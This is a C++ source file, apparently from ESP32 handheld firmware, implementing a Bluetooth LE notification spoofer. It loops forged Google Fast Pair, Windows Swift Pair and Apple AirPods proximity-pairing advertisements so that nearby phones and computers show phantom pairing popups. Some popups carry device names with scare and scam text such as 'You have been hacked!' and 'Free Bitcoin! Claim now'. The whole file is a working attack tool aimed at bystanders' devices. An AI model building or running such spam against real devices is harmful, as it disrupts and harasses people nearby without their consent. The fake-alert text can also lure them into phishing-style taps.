#if !defined(LITE_VERSION)
#include "notif_spoofer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <globals.h>

static const char *NOTIF_MESSAGES[] = {
    "You have been hacked!",
    "Your WiFi password is exposed",
    "Someone is watching you",
    "Security alert: device compromised",
    "Update required: tap here",
    "Free Bitcoin! Claim now",
    "Warning: malware detected",
    "Your location is being shared",
    "Camera access detected",
    "Unauthorized login attempt",
};
static const int NUM_MESSAGES = sizeof(NOTIF_MESSAGES) / sizeof(NOTIF_MESSAGES[0]);

static int notifsSent = 0;

static void sendSwiftPairSpam(NimBLEAdvertising *adv) {
    NimBLEAdvertisementData advData;

    std::string mfgData;
    mfgData += (char)0x06;
    mfgData += (char)0x00;
    mfgData += (char)0x03;
    mfgData += (char)0x00;

    for (int i = 0; i < 6; i++) {
        mfgData += (char)random(256);
    }

    advData.setManufacturerData(mfgData);
    advData.setName(NOTIF_MESSAGES[random(NUM_MESSAGES)]);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

static void sendGoogleFastPair(NimBLEAdvertising *adv) {
    NimBLEAdvertisementData advData;

    std::string serviceData;
    serviceData += (char)0x2C;
    serviceData += (char)0xFE;

    for (int i = 0; i < 3; i++) {
        serviceData += (char)random(256);
    }

    advData.setServiceData(NimBLEUUID((uint16_t)0xFE2C), serviceData);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

static void sendAppleProximityPairing(NimBLEAdvertising *adv) {
    NimBLEAdvertisementData advData;

    std::string mfgData;
    mfgData += (char)0x4C;
    mfgData += (char)0x00;
    mfgData += (char)0x07;
    mfgData += (char)0x19;
    mfgData += (char)0x07;

    static const uint8_t models[][2] = {
        {0x02, 0x20}, {0x0E, 0x20}, {0x0A, 0x20}, {0x14, 0x20},
        {0x03, 0x20}, {0x12, 0x20}, {0x10, 0x20},
    };
    int modelIdx = random(7);
    mfgData += (char)models[modelIdx][0];
    mfgData += (char)models[modelIdx][1];

    for (int i = 0; i < 22; i++) {
        mfgData += (char)random(256);
    }

    advData.setManufacturerData(mfgData);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

void notifSpoofer() {
    notifsSent = 0;

    options.clear();
    int mode = -1;
    options.push_back({"Android (Fast Pair)", [&mode]() { mode = 0; }});
    options.push_back({"Windows (Swift Pair)", [&mode]() { mode = 1; }});
    options.push_back({"iOS (AirPods Popup)", [&mode]() { mode = 3; }});
    options.push_back({"All Platforms", [&mode]() { mode = 2; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "Target Platform");

    if (mode < 0) return;

    NimBLEDevice::deinit(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    if (!NimBLEDevice::init("")) {
        displayError("BLE init failed", true);
        return;
    }
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();

    unsigned long startTime = millis();

    NimBLEDevice::setSecurityAuth(false, false, false);

    while (true) {
        if (mode == 0 || (mode == 2 && notifsSent % 3 == 0)) {
            sendGoogleFastPair(pAdvertising);
        }
        if (mode == 1 || (mode == 2 && notifsSent % 3 == 1)) {
            sendSwiftPairSpam(pAdvertising);
        }
        if (mode == 3 || (mode == 2 && notifsSent % 3 == 2)) {
            sendAppleProximityPairing(pAdvertising);
        }

        pAdvertising->start();
        delay(30);
        pAdvertising->stop();
        notifsSent++;

        if (notifsSent % 10 == 0) {
            drawMainBorderWithTitle("Notif Spoofer");
            int y = 45;
            int padX = 12;

            tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("SPAMMING NOTIFICATIONS");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            String modeStr = mode == 0 ? "Android" : mode == 1 ? "Windows" : "All";
            tft.print("Mode: " + modeStr);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Notifications: %d", notifsSent);
            y += 14;

            unsigned long elapsed = (millis() - startTime) / 1000;
            tft.setCursor(padX, y);
            tft.printf("Elapsed: %lus", elapsed);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Rate: ~%d/sec", notifsSent / max(1UL, elapsed));
            y += 18;

            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Nearby devices will see");
            y += 12;
            tft.setCursor(padX, y);
            tft.print("phantom device popups!");

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) break;
        esp_task_wdt_reset();
        delay(10);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}
#endif
